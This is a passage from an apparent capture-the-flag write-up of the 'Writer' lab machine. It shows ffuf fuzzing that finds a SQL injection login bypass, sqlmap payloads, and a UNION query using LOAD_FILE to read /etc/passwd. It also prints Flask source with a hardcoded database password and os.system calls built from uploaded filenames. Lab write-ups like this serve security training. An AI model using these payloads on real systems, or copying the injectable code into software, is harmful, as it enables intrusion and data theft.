</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> writer.htb
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
Content-Length<span style="color:#ff79c6">:</span> 42
Origin<span style="color:#ff79c6">:</span> http://writer.htb
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1

uname=UNAME&amp;password=PASS
</code></pre></td></tr></table>
</div>
</div><p>Then I can install and run FFUFF. <a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#pitchfork">Everything you need to know about FFUF is here</a>. A Masterclass.</p>
<pre><code>git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build

ffuf -X POST -request ~/htb/writer/req.txt \
        -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt:UNAME \
        -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt:PASS  \
        -t 200 -request-proto http -mode pitchfork -c -fs 808

[Status: 200, Size: 607, Words: 5, Lines: 1, Duration: 247ms]
* PASS: ' or 1=1 or ''='
* UNAME: ' or 1=1 or ''='
</code></pre>
<p>We are redirected to a Dashboard</p>
<p>Before exploring the dashboard, we can execute sqlmap to get more details on the vulnerable query:</p>
<pre><code>./sqlmap.py -r ~/htb/writer/req.txt
[..]
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=UNAME' AND (SELECT 2843 FROM (SELECT(SLEEP(5)))YloQ) AND 'lodh'='lodh&amp;password=PASS

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: uname=UNAME' UNION ALL SELECT NULL,CONCAT(0x716b7a6a71,0x464271526b594b6675575467647a4c4d6b787a6d577a704765424e71434744546651494e69536e74,0x7170627a71),NULL,NULL,NULL,NULL-- -&amp;password=PASS
</code></pre>
<p>We have permissions to read files:</p>
<pre><code>./sqlmap.py -r ~/htb/writer/req.txt --privileges
database management system users privileges:
[*] 'admin'@'localhost' [1]:
    privilege: FILE
</code></pre>
<p>Let&rsquo;s craft a query to extract files:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>plain</td>
<td>' UNION ALL SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6;&ndash; -</td>
</tr>
<tr>
<td>urlencode</td>
<td>&lsquo;+UNION+ALL+SELECT+1,LOAD_FILE('/etc/passwd&rsquo;),3,4,5,6%3b&ndash;+-</td>
</tr>
</tbody>
</table>
<p>We can find users john and kyle.</p>
<pre><code>kyle❌1000:1000:Kyle Travis:/home/kyle:/bin/bash
john❌1001:1001:,,,:/home/john:/bin/bash
</code></pre>
<p>The default layout for apache 2.x on ubuntu is described on <a href="https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Debian,Ubuntu(Apachehttpd2.x)">apache wiki</a>, but is not so precise. To be more precise, let&rsquo;s download apache-2.4.41 to see it&rsquo;s structure:</p>
<pre><code>docker run --rm -it ubuntu bash
root@98853d8e4b8f:/# apt-get update
root@98853d8e4b8f:/# apt list -a apache2 | grep 2.4.41
[..]
apache2/focal-updates 2.4.41-4ubuntu3.7 amd64
apache2/focal-security 2.4.41-4ubuntu3.6 amd64
apache2/focal 2.4.41-4ubuntu3 amd64
root@98853d8e4b8f:/# apt-get install apache2=2.4.41-4ubuntu3.7 ssl-cert
root@98853d8e4b8f:/# cd /etc/apache2/
root@98853d8e4b8f:/etc/apache2# find . | egrep &quot;sites|apache2&quot; | grep conf
./sites-enabled/000-default.conf
./apache2.conf
./sites-available/000-default.conf
./sites-available/default-ssl.conf
</code></pre>
<p>Exploring default sites available we find two more interesting files and directories:</p>
<ul>
<li>/var/www/writer.htb/writer is the root directory</li>
<li>/var/www/writer.htb/writer/wsgi is the website</li>
</ul>
<p>000-default.conf:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"># Virtual host configuration for writer.htb domain
<span style="color:#ff79c6">&lt;VirtualHost</span> *:80<span style="color:#ff79c6">&gt;</span>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb<span style="color:#ff79c6">&gt;</span>
                Order allow,deny
                Allow from all
        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
        Alias /static /var/www/writer.htb/writer/static
        <span style="color:#ff79c6">&lt;Directory</span> /var/www/writer.htb/writer/static<span style="color:#ff79c6">/&gt;</span>
                Order allow,deny
                Allow from all
        <span style="color:#ff79c6">&lt;/Directory&gt;</span>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
<span style="color:#ff79c6">&lt;/VirtualHost&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>writer.wsgi:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python</span>
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">import</span> logging
<span style="color:#ff79c6">import</span> random
<span style="color:#ff79c6">import</span> os

<span style="color:#6272a4"># Define logging</span>
logging<span style="color:#ff79c6">.</span>basicConfig(stream<span style="color:#ff79c6">=</span>sys<span style="color:#ff79c6">.</span>stderr)
sys<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>insert(<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;/var/www/writer.htb/&#34;</span>)

<span style="color:#6272a4"># Import the __init__.py from the app folder</span>
<span style="color:#ff79c6">from</span> writer <span style="color:#ff79c6">import</span> app <span style="color:#ff79c6">as</span> application
application<span style="color:#ff79c6">.</span>secret_key <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><p>We infer from row 12 that there is a <strong>/var/www/writer.htb/writer/__init__.py</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask, session, redirect, url_for, request, render_template
<span style="color:#ff79c6">from</span> mysql.connector <span style="color:#ff79c6">import</span> errorcode
<span style="color:#ff79c6">import</span> mysql.connector
<span style="color:#ff79c6">import</span> urllib.request
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> PIL
<span style="color:#ff79c6">from</span> PIL <span style="color:#ff79c6">import</span> Image, UnidentifiedImageError
<span style="color:#ff79c6">import</span> hashlib

app <span style="color:#ff79c6">=</span> Flask(__name__,static_url_path<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>,static_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;static&#39;</span>,template_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;templates&#39;</span>)

<span style="color:#6272a4">#Define connection for database</span>
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">connections</span>():
    <span style="color:#ff79c6">try</span>:
        connector <span style="color:#ff79c6">=</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>connect(user<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;admin&#39;</span>, password<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;ToughPasswordToCrack&#39;</span>, host<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, database<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;writer&#39;</span>)
        <span style="color:#ff79c6">return</span> connector
    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]

@app<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit_story</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> (<span style="color:#f1fa8c">&#39;user&#39;</span> <span style="color:#ff79c6">in</span> session):
        <span style="color:#ff79c6">return</span> redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
    <span style="color:#ff79c6">try</span>:
        connector <span style="color:#ff79c6">=</span> connections()
    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
            <span style="color:#ff79c6">return</span> (<span style="color:#f1fa8c">&#34;Database error&#34;</span>)
    <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>method <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span>:
        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM stories where id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">;&#34;</span>, {<span style="color:#f1fa8c">&#39;id&#39;</span>: <span style="color:#8be9fd;font-style:italic">id</span>})
        results <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]:
            image <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]
            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image<span style="color:#ff79c6">.</span>filename:
                path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style="color:#ff79c6">.</span>filename)
                image<span style="color:#ff79c6">.</span>save(path)
                image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image<span style="color:#ff79c6">.</span>filename)
                cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
                result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()
            <span style="color:#ff79c6">else</span>:
                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>):
            image_url <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>)
            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image_url:
                <span style="color:#ff79c6">try</span>:
                    local_filename, headers <span style="color:#ff79c6">=</span> urllib<span style="color:#ff79c6">.</span>request<span style="color:#ff79c6">.</span>urlretrieve(image_url)
                    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename, local_filename))
                    image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename)
                    <span style="color:#ff79c6">try</span>:
                        im <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>open(image)
                        im<span style="color:#ff79c6">.</span>verify()
                        im<span style="color:#ff79c6">.</span>close()
                        image <span style="color:#ff79c6">=</span> image<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;/tmp/&#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span>)
                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv /tmp/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> /var/www/writer.htb/writer/static/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image, image))
                        image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image)
                        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
                        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
                        result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()

                    <span style="color:#ff79c6">except</span> PIL<span style="color:#ff79c6">.</span>UnidentifiedImageError:
                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;rm </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image))
                        error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Not a valid image file!&#34;</span>
                        <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
                <span style="color:#ff79c6">except</span>:
                    error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Issue uploading picture&#34;</span>
                    <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
            <span style="color:#ff79c6">else</span>:
                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)

    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
   app<span style="color:#ff79c6">.</span>run(<span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><p>There is a first vulnerabiity on row 28-29 : we can post an image with <code>request.files['image']</code> and it will be saved in <strong>/static/img</strong> as long as it contains <code>.jpg</code> in its name (it does not have to be the extension).</p>
<pre><code>        if &quot;.jpg&quot; in image.filename:
            path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
</code></pre>
